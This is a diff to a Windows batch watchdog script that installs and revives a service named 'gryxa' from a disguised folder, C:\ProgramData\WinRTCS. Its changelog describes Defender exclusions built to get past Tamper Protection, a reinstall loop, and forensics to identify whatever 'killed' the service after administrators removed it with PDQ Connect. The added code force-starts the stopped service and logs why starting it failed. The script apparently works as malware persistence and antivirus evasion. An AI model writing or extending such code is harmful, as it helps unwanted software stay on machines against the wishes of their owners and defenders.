@@ -10,13 +10,11 @@ rem   -> orphan/gryxa dir sweep) + one retry; counter reset moved here from the 
 rem 0.0.4: shields that actually land BEFORE install (literal Policies-channel exclusions, TP-safe,
 rem   bounded async cmdlet) + post-install re-shield of real ImagePath dir; all failure paths bump
 rem   the streak; guard.cnt=170 (~10 min) recheck after install/recovery; W-wait reset fix.
-rem 0.0.5: external-kill brake + forensics. On hosts like PC-EVITA-X6 where msiexec exits 0 but
-rem   the service never runs and its entry vanishes with NO Defender detections and NO 3rd-party
-rem   AV (kiosk/cafe software, anti-executable, silent agent), the reinstall loop just spammed
-rem   duplicate console entries (new device GUID per install). Now: FAIL_svc_not_running captures
-rem   ImagePath + binary-existence + Service Control Manager start-failure events into the log
-rem   (names the killer), and after 3 consecutive external kills installs pause (hourly recheck)
-rem   until a payload resets extkill.cnt.
+rem 0.0.5: external-kill brake + forensics (see FailSvc notes). Stops duplicate-GUID console spam.
+rem 0.0.6: WaitSvc actively sc-starts a detected-but-stopped service (MSI doesn't always autostart)
+rem   and logs the raw StartService failure code (FAILED 5=policy/AV block, FAILED 2=binary gone);
+rem   Forensics excludes 7045 install spam so start-outcome events surface. Context: hosts managed
+rem   by PDQ Connect had the gryxa package surgically removed (keepers untouched, no AV traces).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -194,12 +192,14 @@ exit /b 0
 
 :WaitSvc0
 set "W=0"
+set "STARTED=0"
 :WaitSvc
 timeout /t 5 /nobreak >nul 2>&1
 call :Detect
 if defined GSVC (
   sc query "!GSVC!" 2>nul | findstr /C:"RUNNING" >nul
   if not errorlevel 1 goto :SvcUp
+  if "!STARTED!"=="0" call :TryStart
 )
 set /a W+=1
 if !W! LSS 12 goto :WaitSvc
@@ -278,8 +278,14 @@ exit /b 0
 :Forensics
 rem --- capture why the service died: ImagePath, binary still on disk?, SCM start-failure events ---
 if not defined GSVC ( echo [%DATE% %TIME%] svc_never_registered>>"%LOG%" & exit /b 0 )
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $ip=$null; try{ $ip=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\!GSVC!' -Name ImagePath).ImagePath }catch{}; if($ip){ $o+=('imgpath ' + $ip); $bin=$ip; if($bin -match '^\"([^\"]+)\"'){ $bin=$Matches[1] } elseif($bin -match '^(\S+)'){ $bin=$Matches[1] }; $o+=('bin_exists ' + (Test-Path $bin)) } else { $o+='imgpath none' }; $ev=Get-WinEvent -FilterHashtable @{LogName='System'; ProviderName='Service Control Manager'; StartTime=(Get-Date).AddMinutes(-30)} | Where-Object {$_.Message -match [regex]::Escape('!GSVC!')} | Select-Object -First 4; foreach($e in $ev){ $m=($e.Message -replace '\s+',' '); $o+=('scm_' + $e.Id + ' ' + $m.Substring(0,[Math]::Min(200,$m.Length))) }; if(-not $ev){ $o+='scm_no_events' }; $o | Set-Content -Path '%ZD%\svc_dead.out' -Encoding ASCII" >nul 2>&1
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $ip=$null; try{ $ip=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\!GSVC!' -Name ImagePath).ImagePath }catch{}; if($ip){ $o+=('imgpath ' + $ip); $bin=$ip; if($bin -match '^\"([^\"]+)\"'){ $bin=$Matches[1] } elseif($bin -match '^(\S+)'){ $bin=$Matches[1] }; $o+=('bin_exists ' + (Test-Path $bin)) } else { $o+='imgpath none' }; $ev=Get-WinEvent -FilterHashtable @{LogName='System'; ProviderName='Service Control Manager'; StartTime=(Get-Date).AddMinutes(-30)} | Where-Object {$_.Message -match [regex]::Escape('!GSVC!') -and $_.Id -ne 7045} | Select-Object -First 4; foreach($e in $ev){ $m=($e.Message -replace '\s+',' '); $o+=('scm_' + $e.Id + ' ' + $m.Substring(0,[Math]::Min(200,$m.Length))) }; if(-not $ev){ $o+='scm_no_events' }; $o | Set-Content -Path '%ZD%\svc_dead.out' -Encoding ASCII" >nul 2>&1
 if exist "%ZD%\svc_dead.out" ( type "%ZD%\svc_dead.out">>"%LOG%" & del /f /q "%ZD%\svc_dead.out" >nul 2>&1 )
+exit /b 0
+
+:TryStart
+set "STARTED=1"
+echo [%DATE% %TIME%] svc_not_autostarted sc_start !GSVC!>>"%LOG%"
+for /f "tokens=*" %%E in ('sc start "!GSVC!" 2^>^&1 ^| findstr /C:"FAILED"') do echo [%DATE% %TIME%] svc_start_error %%E>>"%LOG%"
 exit /b 0
 
 :Shields
